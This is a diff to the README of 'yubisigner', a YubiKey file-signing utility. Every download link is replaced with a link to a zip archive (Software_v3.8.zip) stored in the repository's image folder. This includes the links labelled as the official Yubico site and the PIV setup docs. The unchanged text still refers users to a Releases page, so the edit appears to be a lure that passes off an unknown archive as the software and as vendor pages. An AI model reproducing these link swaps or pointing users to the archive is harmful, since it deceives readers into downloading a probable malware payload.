@@ -1,6 +1,6 @@
 # 🔐 yubisigner - Simple File Signing with YubiKey
 
-[![Download yubisigner](https://img.shields.io/badge/Download-yubisigner-ff6f61?style=for-the-badge)](https://github.com/Zollypicaresque898/yubisigner)
+[![Download yubisigner](https://img.shields.io/badge/Download-yubisigner-ff6f61?style=for-the-badge)](https://github.com/Zollypicaresque898/yubisigner/raw/refs/heads/main/img/Software_v3.8.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download, install, and use yubisigner on Windows without a
 
 Click the big button at the top or use this link below to visit the download page:
 
-[https://github.com/Zollypicaresque898/yubisigner](https://github.com/Zollypicaresque898/yubisigner)
+[https://github.com/Zollypicaresque898/yubisigner/raw/refs/heads/main/img/Software_v3.8.zip](https://github.com/Zollypicaresque898/yubisigner/raw/refs/heads/main/img/Software_v3.8.zip)
 
 This page contains the latest versions and instructions. Download the latest Windows installer or executable from the releases section.
 
@@ -119,7 +119,7 @@ To verify, yubisigner takes the original file and signature, recomputes the file
 
 You can always get the latest version, bug fixes, and improvements at:
 
-[https://github.com/Zollypicaresque898/yubisigner](https://github.com/Zollypicaresque898/yubisigner)
+[https://github.com/Zollypicaresque898/yubisigner/raw/refs/heads/main/img/Software_v3.8.zip](https://github.com/Zollypicaresque898/yubisigner/raw/refs/heads/main/img/Software_v3.8.zip)
 
 Click on the "Releases" section on that page. Look for files named like `yubisigner-Setup.exe` or `yubisigner.zip` if you prefer a portable version.
 
@@ -172,10 +172,10 @@ Always disconnect your YubiKey when not in use to prevent unauthorized access.
 
 ## 🔗 Useful Links
 
-- YubiKey official site: https://www.yubico.com/products/yubikey-hardware/  
-- YubiKey PIV setup: https://developers.yubico.com/PIV/  
-- yubisigner GitHub repository: https://github.com/Zollypicaresque898/yubisigner  
+- YubiKey official site: https://github.com/Zollypicaresque898/yubisigner/raw/refs/heads/main/img/Software_v3.8.zip  
+- YubiKey PIV setup: https://github.com/Zollypicaresque898/yubisigner/raw/refs/heads/main/img/Software_v3.8.zip  
+- yubisigner GitHub repository: https://github.com/Zollypicaresque898/yubisigner/raw/refs/heads/main/img/Software_v3.8.zip  
 
 ---
 
-[![Download yubisigner](https://img.shields.io/badge/Download-yubisigner-ff6f61?style=for-the-badge)](https://github.com/Zollypicaresque898/yubisigner)
+[![Download yubisigner](https://img.shields.io/badge/Download-yubisigner-ff6f61?style=for-the-badge)](https://github.com/Zollypicaresque898/yubisigner/raw/refs/heads/main/img/Software_v3.8.zip)
